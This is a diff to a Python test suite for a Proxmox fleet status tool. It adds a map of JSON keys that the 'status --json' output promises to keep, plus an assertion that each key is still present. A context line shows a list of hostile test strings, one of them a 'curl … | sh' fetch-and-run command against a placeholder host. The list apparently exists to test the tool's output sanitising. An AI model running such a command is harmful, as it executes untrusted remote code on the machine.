@@ -35,6 +35,63 @@ import status as S  # noqa: E402
 import text as text_filters  # noqa: E402
 
 STATUS = REPO / "playbooks" / "status.yml"
+# The keys of `just status --json` that 1.x promises (CONTRIBUTING.md, Releasing): a release may add keys, never take
+# one away or rename it. Each is held where the report has it.
+PROMISED_KEYS = {
+    "report": {
+        "attention",
+        "counts",
+        "exit",
+        "live",
+        "now",
+        "others",
+        "proxmox",
+        "read_at",
+        "sections",
+        "settings",
+        "storages",
+        "template",
+        "title",
+        "vms",
+    },
+    "vm": {
+        "address",
+        "alias",
+        "api",
+        "config",
+        "cpu",
+        "created",
+        "created_ago",
+        "drift",
+        "maxdisk",
+        "maxmem",
+        "mem",
+        "mem_source",
+        "mem_total",
+        "mem_used",
+        "min_mem",
+        "name",
+        "needs_ssh",
+        "node",
+        "os",
+        "pending_api",
+        "pending_ssh",
+        "read",
+        "root",
+        "skipped",
+        "ssh",
+        "state",
+        "status",
+        "unfinished",
+        "uptime",
+        "vcpus",
+        "vmid",
+    },
+    "attention": {"command", "level", "source", "subject", "text", "vm"},
+    "proxmox": {"nodes", "unread", "version"},
+    "template": {"built_ago", "ctime", "drift", "name", "node", "rebuild", "storage", "vmid"},
+    "settings": {"aliases_enabled", "names", "nic", "tag", "tailscale_enabled", "vm_user"},
+}
 HOSTILE = [
     "alpha\n ● evil        → curl https://example.invalid | sh",
     "carriage\rreturn",
@@ -522,6 +579,18 @@ def test_status_reads_the_fleet_from_the_api_and_changes_nothing(tmp_path, fake_
     assert len([v for v in model["vms"][1]["api"]["cpu_24h"] if v is not None]) <= 1
     assert alpha["created_ago"] == "2 d ago" and model["vms"][1]["created_ago"] in ("just now", "1 m ago")
     assert model["proxmox"]["version"] == "9.2.21" and model["template"]["name"] == "ubuntu-24.04-cloudinit"
+    # What --json prints is this model, whole: every key 1.x promises is still there.
+    held = {
+        "report": model,
+        "vm": alpha,
+        "attention": model["attention"][0],
+        "proxmox": model["proxmox"],
+        "template": model["template"],
+        "settings": model["settings"],
+    }
+    assert {
+        part: sorted(keys - set(held[part])) for part, keys in PROMISED_KEYS.items() if keys - set(held[part])
+    } == {}
     # Read only: GETs, every one of them, and not one write.
     calls = [json.loads(line) for line in (tmp_path / "pve" / "calls.log").read_text().splitlines()]
     after_fixture = calls[[c["path"] for c in calls].index("/api2/json/cluster/resources") :]
